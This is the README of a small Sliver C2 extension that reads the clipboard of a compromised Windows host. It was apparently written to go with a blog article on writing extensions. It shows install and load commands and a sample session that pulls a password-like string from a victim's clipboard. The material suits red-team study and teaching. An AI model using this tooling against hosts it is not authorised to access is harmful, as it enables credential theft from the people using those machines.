# GetClipboardData
A quick and dirty extension for Sliver C2 to retrieve the most recent data from a Windows host’s clipboard. It was built for Sliver 1.5.43, though it should work with the latest release.

This project was built for our article on [writing extensions in Sliver C2](https://hackerforce.io/blog/writing-extensions-in-sliver-c2/).

# Installation

Before installing the extension, extract the contents to a local directory using `tar`:

```
$ tar -xzvf GetClipboardData.tar.gz
GetClipboardData/
GetClipboardData/extension.json
GetClipboardData/GetClipboardData.c
GetClipboardData/GetClipboardData.x64.dll
```

Once extracted, use the `extensions` command in Sliver with the `install` argument, followed by the path to the extracted directory:

```
sliver > extensions install GetClipboardData

[*] Installing extension 'GetClipboardData' (0.0.2) ...
```

With the extension installed, use the `load` argument to load it into Sliver:

```
sliver > extensions load GetClipboardData

[*] Added GetClipboardData command: A quick and dirty extension for Sliver C2 to retrieve the most recent data from a Windows host's clipboard.
```

> [!note]
> Sliver extensions are also loaded automatically when the client first starts.

# Usage

When used, the extension retrieves the most recent item from the clipboard. For example:

```
sliver > use f0b6a783-ce01-49a0-a2a7-336f2b44a02d

[*] Active session OPTIMISTIC_DECADE (f0b6a783-ce01-49a0-a2a7-336f2b44a02d)

sliver (OPTIMISTIC_DECADE) > GetClipboardData

[*] Successfully executed GetClipboardData
[*] Got output:
ILuvHF2026!
```

If there are no items, however, Sliver outputs:

```
sliver (OPTIMISTIC_DECADE) > GetClipboardData

[!] Call extension error: rpc error: code = Unknown desc = Element not found.
```
